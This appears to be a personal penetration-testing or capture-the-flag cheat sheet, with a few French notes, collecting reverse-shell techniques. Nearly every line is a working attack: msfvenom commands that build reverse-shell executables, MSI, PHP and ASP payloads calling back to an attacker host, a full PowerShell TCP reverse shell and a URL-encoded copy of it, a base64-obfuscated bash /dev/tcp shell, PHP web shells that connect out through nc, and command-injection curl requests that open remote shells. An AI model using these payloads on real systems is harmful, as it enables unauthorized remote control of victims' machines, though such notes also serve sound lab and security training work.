
## _SSH Command Execution_
```
ssh -p 2220 bandit18@bandit.labs.overthewire.org -t "cat /home/bandit18/readme"
```

# reverShells
## listener on a local port
```
rlwrap nc -lvnp 1234
```

## msfvenom payload
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe
```
service
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe
```
PHP  
```
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php
```
ASP  
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp
```
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
```
### meterpreter
`msf6 > use exploit/multi/handler `
replace `windows/x64/shell_reverse_tcp` by `windows/meterpreter/reverse_tcp`
## _reverse shell from the remote server_
```
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('**<ip>**',**<port>**);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

# web shell
```
powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII
```
### can encode payload in Base64 
	marche pour les formulaire
```
echo -n 'bash -i >& /dev/tcp/10.10.17.161/1234 0>&1' | base64 -w 0
```
```
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNy4xNjEvMTIzNCAwPiYx | base64 -d | bash
```
## _Create end send a reverse shell php file to webvictim_
```
echo '<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.108 1234 >/tmp/f"); ?>' > shell.php
```
```
echo "<?php system('bash -i >& /dev/tcp/10.201.1.201/1234 0>&1');?>" > shell.php
```
## _form post_
```
curl 'http://remote@ip' -X POST -d 'url=http%3A%2F%2FLOCAL-ADDRESS%3ALOCAL-PORT%2F%3Fname%3D%2520%60+ruby+-rsocket+-e%27spawn%28%22sh%22%2C%5B%3Ain%2C%3Aout%2C%3Aerr%5D%3D%3ETCPSocket.new%28%22LOCAL-ADDRESS%22%2CLOCAL-PORT%29%29%27%60'
```
	| `ctrl+z` then `stty raw -echo` then `fg` then `enter` twice | Upgrade shell TTY (2) |
	| `curl -X POST http://remot@IP/.%0d./.%0d./.%0d./bin/sh -d 'id | nc L@IP port'` | RCE
## _to allow the call backs on port 80 and 443 to our machine_
```
ufw allow from adresseip proto tcp to any port 80,443
```
